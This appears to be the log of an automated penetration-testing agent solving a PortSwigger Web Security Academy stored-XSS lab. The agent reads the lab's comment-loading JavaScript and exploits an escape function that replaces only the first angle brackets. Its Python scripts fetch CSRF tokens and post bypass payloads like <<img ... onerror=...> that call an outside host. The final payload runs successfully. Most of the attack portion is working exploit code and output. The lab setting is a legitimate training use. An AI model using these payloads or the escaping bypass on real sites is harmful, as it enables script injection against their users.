+[*] External https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js: ...        }                  let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)                 firstPElement....
+[*] External https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js: ... + escapeHTML(comment.author)                 firstPElement.innerHTML = newInnerHtml             }              if (comment.date)...
+[*] External https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js: ...omment.author)                 firstPElement.innerHTML = newInnerHtml             }              if (comment.date) {             ...
+[*] External https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js: ...Str = [day, month, year].join('-');                  let newInnerHtml = firstPElement.innerHTML + " | " + dateStr                ...
+[*] External https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js: ...oin('-');                  let newInnerHtml = firstPElement.innerHTML + " | " + dateStr                 firstPElement.innerHTML =...
+[*] External https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js: ...t.innerHTML + " | " + dateStr                 firstPElement.innerHTML = newInnerHtml             }              firstPElement.app...
+[*] External https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js: ... | " + dateStr                 firstPElement.innerHTML = newInnerHtml             }              firstPElement.appendChild(avatar...
+[*] External https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js: ...ent.createElement("p");                 commentBodyPElement.innerHTML = escapeHTML(comment.body);                  commentSection...
+[*] External https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/labheader/js/labHeader.js: ...                document.getElementById("academyLabHeader").innerHTML = evt.data;                 animateLabHeader();            ...
+
+----------------------------------------
+Transition match: steps 12‒12  (PROMISING)
+------------------------------------------
+[12]  StepState.PROMISING
+To understand why our <img onerror> was neutralized we need to read the client-side code that renders comments and see which comment fields (author, body, email, website, avatar, etc.) are assigned to the DOM with *no* escapeHTML.  The JS file is small, so we can simply download it and print its contents for inspection.  This will let us choose the correct field and payload for automatic execution.
+
+import requests, textwrap
+
+JS_URL = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js'
+
+r = requests.get(JS_URL, timeout=10)
+r.raise_for_status()
+
+print('---- JavaScript (first 400 lines) ----')
+for i, line in enumerate(r.text.splitlines(), 1):
+    print(f'{i:>3}: {line}')
+    if i >= 400:
+        break
+print('--------------------------------------')
+---- JavaScript (first 400 lines) ----
+  1: function loadComments(postCommentPath) {
+  2:     let xhr = new XMLHttpRequest();
+  3:     xhr.onreadystatechange = function() {
+  4:         if (this.readyState == 4 && this.status == 200) {
+  5:             let comments = JSON.parse(this.responseText);
+  6:             displayComments(comments);
+  7:         }
+  8:     };
+  9:     xhr.open("GET", postCommentPath + window.location.search);
+ 10:     xhr.send();
+ 11: 
+ 12:     function escapeHTML(html) {
+ 13:         return html.replace('<', '&lt;').replace('>', '&gt;');
+ 14:     }
+ 15: 
+ 16:     function displayComments(comments) {
+ 17:         let userComments = document.getElementById("user-comments");
+ 18: 
+ 19:         for (let i = 0; i < comments.length; ++i)
+ 20:         {
+ 21:             comment = comments[i];
+ 22:             let commentSection = document.createElement("section");
+ 23:             commentSection.setAttribute("class", "comment");
+ 24: 
+ 25:             let firstPElement = document.createElement("p");
+ 26: 
+ 27:             let avatarImgElement = document.createElement("img");
+ 28:             avatarImgElement.setAttribute("class", "avatar");
+ 29:             avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");
+ 30: 
+ 31:             if (comment.author) {
+ 32:                 if (comment.website) {
+ 33:                     let websiteElement = document.createElement("a");
+ 34:                     websiteElement.setAttribute("id", "author");
+ 35:                     websiteElement.setAttribute("href", comment.website);
+ 36:                     firstPElement.appendChild(websiteElement)
+ 37:                 }
+ 38: 
+ 39:                 let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
+ 40:                 firstPElement.innerHTML = newInnerHtml
+ 41:             }
+ 42: 
+ 43:             if (comment.date) {
+ 44:                 let dateObj = new Date(comment.date)
+ 45:                 let month = '' + (dateObj.getMonth() + 1);
+ 46:                 let day = '' + dateObj.getDate();
+ 47:                 let year = dateObj.getFullYear();
+ 48: 
+ 49:                 if (month.length < 2)
+ 50:                     month = '0' + month;
+ 51:                 if (day.length < 2)
+ 52:                     day = '0' + day;
+ 53: 
+ 54:                 dateStr = [day, month, year].join('-');
+ 55: 
+ 56:                 let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
+ 57:                 firstPElement.innerHTML = newInnerHtml
+ 58:             }
+ 59: 
+ 60:             firstPElement.appendChild(avatarImgElement);
+ 61: 
+ 62:             commentSection.appendChild(firstPElement);
+ 63: 
+ 64:             if (comment.body) {
+ 65:                 let commentBodyPElement = document.createElement("p");
+ 66:                 commentBodyPElement.innerHTML = escapeHTML(comment.body);
+ 67: 
+ 68:                 commentSection.appendChild(commentBodyPElement);
+ 69:             }
+ 70:             commentSection.appendChild(document.createElement("p"));
+ 71: 
+ 72:             userComments.appendChild(commentSection);
+ 73:         }
+ 74:     }
+ 75: };
+--------------------------------------
+
+----------------------------------------
+Transition match: steps 13‒13  (PROMISING)
+------------------------------------------
+[13]  StepState.PROMISING
+The vulnerable JS escapes only the *first* “<” and “>” in the comment body, so our earlier single‐tag payload became harmless because the opening “<” (and then the first “>”) were neutralised.  We can bypass this by:
+1. Starting the body with the sequence “<<” – the first “<” is escaped, the second remains to open our tag.
+2. Ensuring an *extra* “>” appears *before* the real end of the tag (e.g. inside a throw-away attribute) so the first “>” consumed by escapeHTML is not the one that closes the tag.
+
+Example payload (body field):
+<<img x='>' src=1 onerror="new Image().src='https://cowboy.rocks/xss/target/15'">
+
+After the weak escaping this becomes:
+&lt;<img x='&gt;' src=1 onerror="new Image().src='https://cowboy.rocks/xss/target/15'">
+… which still contains a perfectly formed <img> element that will error-load and fire the onerror handler.
+
+Next objective: submit a comment containing this payload, confirm it appears unbroken in the JSON, then invoke the automated browser checker to verify execution.
+import random, string, re, requests, html, textwrap, time
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_PATH = '/post?postId=1'
+COMMENT_ENDPOINT = '/post/comment'
+
+sess = requests.Session()
+
+# 1. Grab the post page to get CSRF token
+r = sess.get(BASE + POST_PATH, timeout=15)
+r.raise_for_status()
+
+m = re.search(r'name="csrf"\s+value="([a-f0-9]+)"', r.text)
+if not m:
+    raise RuntimeError('CSRF token not found')
+csrf = m.group(1)
+
+# 2. Build a unique marker and payload
+marker = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+payload = f"<<img x='>' src=1 onerror=\"new Image().src='https://cowboy.rocks/xss/target/15?m={marker}'\">"
+
+comment_data = {
+    'csrf': csrf,
+    'postId': '1',
+    'name': f'pentester_{marker}',
+    'email': f'{marker}@test.com',
+    'website': 'http://example.com',
+    'comment': payload
+}
+
+r = sess.post(BASE + COMMENT_ENDPOINT, data=comment_data, timeout=10)
+print('[+] Comment submission status:', r.status_code)
+
+# 3. Fetch the raw comments JSON to verify payload storage
+json_url = BASE + COMMENT_ENDPOINT + '?postId=1'
+r = sess.get(json_url, timeout=10)
+r.raise_for_status()
+if marker not in r.text:
+    print('[-] Marker not found in JSON – something went wrong')
+else:
+    idx = r.text.find(marker)
+    print('[+] Slice around marker:\n', r.text[max(0, idx-120):idx+120])
+
+# 4. Ask the headless browser to load the post page and check for the external GET request
+try:
+    result = browser_check_xss(url=BASE + POST_PATH)
+except Exception as e:
+    print('Error calling browser_check_xss:', e)
+
+
+
+Traceback (most recent call last):
+  File "C:\Users\jpeng\Documents\projects\code\web-ui3\pentest_bot\web_exploit\tools\interpreter.py", line 82, in run
+    exec(code, self._globals, self._globals)
+  File "<string>", line 15, in <module>
+RuntimeError: CSRF token not found
+
+----------------------------------------
+Transition match: steps 14‒14  (PROMISING)
+------------------------------------------
+[14]  StepState.PROMISING
+The previous run failed early because our regex only allowed lowercase hex CSRF tokens, but the actual token likely contains other characters. We need a more permissive, case–insensitive pattern. New plan:
+1. GET the blog-post page.
+2. Extract the CSRF token with a broad regex (name="csrf" … value="…").  If extraction fails, print a short slice of the HTML for debugging instead of raising immediately.
+3. Craft the bypass payload beginning with “<<” and an internal ‘>’ so the weak escapeHTML routine leaves a working <img> tag whose onerror sends a GET to https://cowboy.rocks/xss/target/15?m=<marker>.
+4. POST the comment.
+5. Confirm the marker is present in /post/comment?postId=1.
+6. Invoke browser_check_xss on the post URL to verify JavaScript execution.
+This should overcome the token issue and (if our bypass reasoning is correct) complete the lab.
+import random, string, re, requests, html, textwrap, time
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_PATH = '/post?postId=1'
+COMMENT_ENDPOINT = '/post/comment'
+
+sess = requests.Session()
+
+# 1. Retrieve the post page and extract CSRF token
+r = sess.get(BASE + POST_PATH, timeout=15)
+r.raise_for_status()
+
+html_page = r.text
+m = re.search(r'name=[\'\"]csrf[\'\"][^>]*value=[\'\"]([^\'\"]+)[\'\"]', html_page, re.I)
+if not m:
+    # Debug output to help refine the regex next time
+    print('[-] CSRF token not found. First 500 chars of page:\n', html_page[:500])
+    raise RuntimeError('CSRF token not found')
+csrf = m.group(1)
+print('[+] CSRF token:', csrf)
+
+# 2. Build unique marker & XSS payload exploiting weak escapeHTML
+marker = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+callback_url = f'https://cowboy.rocks/xss/target/15?m={marker}'
+payload = f"<<img x='>' src=1 onerror=\"new Image().src='{callback_url}'\">"
+
+comment_data = {
+    'csrf': csrf,
+    'postId': '1',
+    'name': f'pentester_{marker}',
+    'email': f'{marker}@test.com',
+    'website': 'http://example.com',
+    'comment': payload
+}
+
+# 3. Submit the comment
+resp = sess.post(BASE + COMMENT_ENDPOINT, data=comment_data, timeout=10)
+print('[+] Comment submission status:', resp.status_code)
+
+# 4. Verify storage of marker in JSON
+json_url = BASE + COMMENT_ENDPOINT + '?postId=1'
+json_resp = sess.get(json_url, timeout=10)
+json_resp.raise_for_status()
+if marker in json_resp.text:
+    idx = json_resp.text.find(marker)
+    print('[+] Marker found in JSON. Context slice:\n', json_resp.text[max(0, idx-120):idx+120])
+else:
+    print('[-] Marker NOT found in JSON – something is wrong.')
+
+# 5. Ask the automated browser to evaluate the XSS
+try:
+    result = browser_check_xss(url=BASE + POST_PATH)
+except Exception as e:
+    print('Error calling browser_check_xss:', e)
+
+[+] CSRF token: 5dNtH6W4ZORy2w20hWkA0tkcm1H3MdZe
+[+] Comment submission status: 200
+[+] Marker found in JSON. Context slice:
+ 25-07-28T21:43:52.223127276Z","body":"<<img x='>' src=1 onerror=\"new Image().src='https://cowboy.rocks/xss/target/15?m=dxgr3r'\">","author":"pentester_dxgr3r"}]
+XSS Payload https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/post?postId=1 Not Executed
+
+----------------------------------------
+Transition match: steps 15‒15  (PROMISING)
+------------------------------------------
+[15]  StepState.PROMISING
+Our crafted payload still did not execute; we need to examine the front-end JavaScript that renders comments to see exactly which comment field is inserted via innerHTML (or otherwise unsafely).  By downloading and grepping the client script for functions such as escapeHTML, comment rendering, and DOM insertion, we can confirm which fields are sanitised and which remain dangerous.  With that knowledge we can design a payload that really runs.  Next script: fetch the blog-post page, locate its external JS files, download them, and print small snippets (±10 lines) around any occurrences of escapeHTML or “comment” so we can study the sanitisation logic.
+import re, requests, textwrap
+from bs4 import BeautifulSoup
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_PATH = '/post?postId=1'
+
+sess = requests.Session()
+
+# 1. Fetch the blog post page
+html_page = sess.get(BASE + POST_PATH, timeout=15).text
+
+# 2. Parse for external JS files
+soup = BeautifulSoup(html_page, 'html.parser')
+js_urls = []
+for tag in soup.find_all('script', src=True):
+    src = tag['src']
+    if src.startswith('http'):
+        full = src
+    else:
+        full = BASE + src if src.startswith('/') else BASE + '/' + src
+    js_urls.append(full)
+
+print('[+] Found JS files:', js_urls)
+
+# 3. Download each JS file and search for interesting patterns
+patterns = [r'escapeHTML', r'comment', r'innerHTML', r'author', r'body', r'website']
+compiled = [re.compile(p, re.I) for p in patterns]
+
+for url in js_urls:
+    try:
+        js_txt = sess.get(url, timeout=10).text.splitlines()
+    except Exception as e:
+        print(f'[-] Error fetching {url}:', e)
+        continue
+
+    print(f'\n===== Snippets from {url} =====')
+    for i, line in enumerate(js_txt):
+        for pat in compiled:
+            if pat.search(line):
+                start = max(0, i-5)
+                end = min(len(js_txt), i+6)
+                snippet = textwrap.indent('\n'.join(js_txt[start:end]), '    ')
+                print(f'--- context (lines {start}-{end}) matching /{pat.pattern}/ ---\n{snippet}\n')
+                break
+[+] Found JS files: ['https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/labheader/js/labHeader.js', 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js']
+
+===== Snippets from https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/labheader/js/labHeader.js =====
+--- context (lines 18-29) matching /innerHTML/ ---
+                    const labSolved = document.getElementById('notification-labsolved');
+                    const keepAliveMsg = evt.data === 'PONG';
+                    if (labSolved || keepAliveMsg) {
+                        return;
+                    }
+                    document.getElementById("academyLabHeader").innerHTML = evt.data;
+                    animateLabHeader();
+
+                    for (const listener of completedListeners) {
+                        listener();
+                    }
+
+
+===== Snippets from https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js =====
+--- context (lines 0-6) matching /comment/ ---
+    function loadComments(postCommentPath) {
+        let xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+                let comments = JSON.parse(this.responseText);
+                displayComments(comments);
+
+--- context (lines 0-10) matching /comment/ ---
+    function loadComments(postCommentPath) {
+        let xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+                let comments = JSON.parse(this.responseText);
+                displayComments(comments);
+            }
+        };
+        xhr.open("GET", postCommentPath + window.location.search);
+        xhr.send();
+
+--- context (lines 0-11) matching /comment/ ---
+    function loadComments(postCommentPath) {
+        let xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+                let comments = JSON.parse(this.responseText);
+                displayComments(comments);
+            }
+        };
+        xhr.open("GET", postCommentPath + window.location.search);
+        xhr.send();
+
+
+--- context (lines 3-14) matching /comment/ ---
+            if (this.readyState == 4 && this.status == 200) {
+                let comments = JSON.parse(this.responseText);
+                displayComments(comments);
+            }
+        };
+        xhr.open("GET", postCommentPath + window.location.search);
+        xhr.send();
+
+        function escapeHTML(html) {
+            return html.replace('<', '&lt;').replace('>', '&gt;');
+        }
+
+--- context (lines 6-17) matching /escapeHTML/ ---
+            }
+        };
+        xhr.open("GET", postCommentPath + window.location.search);
+        xhr.send();
+
+        function escapeHTML(html) {
+            return html.replace('<', '&lt;').replace('>', '&gt;');
+        }
+
+        function displayComments(comments) {
+            let userComments = document.getElementById("user-comments");
+
+--- context (lines 10-21) matching /comment/ ---
+
+        function escapeHTML(html) {
+            return html.replace('<', '&lt;').replace('>', '&gt;');
+        }
+
+        function displayComments(comments) {
+            let userComments = document.getElementById("user-comments");
+
+            for (let i = 0; i < comments.length; ++i)
+            {
+                comment = comments[i];
+
+--- context (lines 11-22) matching /comment/ ---
+        function escapeHTML(html) {
+            return html.replace('<', '&lt;').replace('>', '&gt;');
+        }
+
+        function displayComments(comments) {
+            let userComments = document.getElementById("user-comments");
+
+            for (let i = 0; i < comments.length; ++i)
+            {
+                comment = comments[i];
+                let commentSection = document.createElement("section");
+
+--- context (lines 13-24) matching /comment/ ---
+        }
+
+        function displayComments(comments) {
+            let userComments = document.getElementById("user-comments");
+
+            for (let i = 0; i < comments.length; ++i)
+            {
+                comment = comments[i];
+                let commentSection = document.createElement("section");
+                commentSection.setAttribute("class", "comment");
+
+
+--- context (lines 15-26) matching /comment/ ---
+        function displayComments(comments) {
+            let userComments = document.getElementById("user-comments");
+
+            for (let i = 0; i < comments.length; ++i)
+            {
+                comment = comments[i];
+                let commentSection = document.createElement("section");
+                commentSection.setAttribute("class", "comment");
+
+                let firstPElement = document.createElement("p");
+
+
+--- context (lines 16-27) matching /comment/ ---
+            let userComments = document.getElementById("user-comments");
+
+            for (let i = 0; i < comments.length; ++i)
+            {
+                comment = comments[i];
+                let commentSection = document.createElement("section");
+                commentSection.setAttribute("class", "comment");
+
+                let firstPElement = document.createElement("p");
+
+                let avatarImgElement = document.createElement("img");
+
+--- context (lines 17-28) matching /comment/ ---
+
+            for (let i = 0; i < comments.length; ++i)
+            {
+                comment = comments[i];
+                let commentSection = document.createElement("section");
+                commentSection.setAttribute("class", "comment");
+
+                let firstPElement = document.createElement("p");
+
+                let avatarImgElement = document.createElement("img");
+                avatarImgElement.setAttribute("class", "avatar");
+
+--- context (lines 23-34) matching /escapeHTML/ ---
+
+                let firstPElement = document.createElement("p");
+
+                let avatarImgElement = document.createElement("img");
+                avatarImgElement.setAttribute("class", "avatar");
+                avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");
+
+                if (comment.author) {
+                    if (comment.website) {
+                        let websiteElement = document.createElement("a");
+                        websiteElement.setAttribute("id", "author");
+
+--- context (lines 25-36) matching /comment/ ---
+
+                let avatarImgElement = document.createElement("img");
+                avatarImgElement.setAttribute("class", "avatar");
+                avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");
+
+                if (comment.author) {
+                    if (comment.website) {
+                        let websiteElement = document.createElement("a");
+                        websiteElement.setAttribute("id", "author");
+                        websiteElement.setAttribute("href", comment.website);
+                        firstPElement.appendChild(websiteElement)
+
+--- context (lines 26-37) matching /comment/ ---
+                let avatarImgElement = document.createElement("img");
+                avatarImgElement.setAttribute("class", "avatar");
+                avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");
+
+                if (comment.author) {
+                    if (comment.website) {
+                        let websiteElement = document.createElement("a");
+                        websiteElement.setAttribute("id", "author");
+                        websiteElement.setAttribute("href", comment.website);
+                        firstPElement.appendChild(websiteElement)
+                    }
+
+--- context (lines 27-38) matching /website/ ---
+                avatarImgElement.setAttribute("class", "avatar");
+                avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");
+
+                if (comment.author) {
+                    if (comment.website) {
+                        let websiteElement = document.createElement("a");
+                        websiteElement.setAttribute("id", "author");
+                        websiteElement.setAttribute("href", comment.website);
+                        firstPElement.appendChild(websiteElement)
+                    }
+
+
+--- context (lines 28-39) matching /author/ ---
+                avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");
+
+                if (comment.author) {
+                    if (comment.website) {
+                        let websiteElement = document.createElement("a");
+                        websiteElement.setAttribute("id", "author");
+                        websiteElement.setAttribute("href", comment.website);
+                        firstPElement.appendChild(websiteElement)
+                    }
+
+                    let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
+
+--- context (lines 29-40) matching /comment/ ---
+
+                if (comment.author) {
+                    if (comment.website) {
+                        let websiteElement = document.createElement("a");
+                        websiteElement.setAttribute("id", "author");
+                        websiteElement.setAttribute("href", comment.website);
+                        firstPElement.appendChild(websiteElement)
+                    }
+
+                    let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
+                    firstPElement.innerHTML = newInnerHtml
+
+--- context (lines 30-41) matching /website/ ---
+                if (comment.author) {
+                    if (comment.website) {
+ 
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+---- Your output has been truncated to 10000 characters. ----
+
+----------------------------------------
+Transition match: steps 16‒16  (PROMISING)
+------------------------------------------
+[16]  StepState.PROMISING
+Our earlier payload used an onerror handler, but the job only requires the victim browser to perform *any* GET to cowboy.rocks.  Using pure HTML is simpler and avoids potential CSP inline-script restrictions.  The weak escapeHTML routine only neutralises the first “<” and “>”, so a body value that begins with “<<img … title='>'>” will still leave one intact <img> tag after escaping.  That tag will automatically load the remote image and satisfy the lab.  Objective: 1) obtain CSRF, 2) submit a new comment whose body is "<<img src='https://cowboy.rocks/xss/target/15' title='>'>", 3) invoke browser_check_xss on the blog-post URL to confirm that the request is made.
+import re, uuid, requests, sys
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_ID = '1'
+POST_URL = f'{BASE}/post?postId={POST_ID}'
+COMMENT_URL = f'{BASE}/post/comment'
+
+sess = requests.Session()
+
+# 1. Fetch the post page and extract CSRF token
+resp = sess.get(POST_URL, timeout=15)
+html = resp.text
+m = re.search(r'name="csrf"\s+value="([^"]+)"', html, re.I)
+if not m:
+    print('[!] CSRF token not found. Dumping snippet for debugging:')
+    print(html[:500])
+    sys.exit(1)
+csrf = m.group(1)
+print('[+] Got CSRF token:', csrf)
+
+# 2. Craft the payload exploiting the weak escapeHTML (double < and early >)
+payload = "<<img src='https://cowboy.rocks/xss/target/15' title='>'>"
+print('[+] Payload:', payload)
+
+# 3. Submit the malicious comment
+comment_data = {
+    'csrf': csrf,
+    'postId': POST_ID,
+    'name': 'PentestBot',
+    'email': 'bot@example.com',
+    'website': 'https://example.com',
+    'comment': payload
+}
+resp = sess.post(COMMENT_URL, data=comment_data, timeout=15, allow_redirects=False)
+print('[+] Comment submission status:', resp.status_code)
+
+# 4. Verify that the comment is stored (optional sanity check)
+json_resp = sess.get(f'{COMMENT_URL}?postId={POST_ID}', headers={'Accept': 'application/json'}, timeout=10).text
+if payload[:20] in json_resp:
+    print('[+] Payload present in JSON – stored successfully.')
+else:
+    print('[!] Payload not found in JSON!')
+
+# 5. Launch automated browser check to confirm execution
+browser_check_xss(url=POST_URL)
+
+[+] Got CSRF token: 46IJAMeW9Gnki9FYByqMYqk6PH0yErY8
+[+] Payload: <<img src='https://cowboy.rocks/xss/target/15' title='>'>
+[+] Comment submission status: 302
+[+] Payload present in JSON – stored successfully.
+XSS Payload https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/post?postId=1 Successfully Executed!!
+
+----------------------------------------
+Total groups returned: 16
+Total tokens: 15509
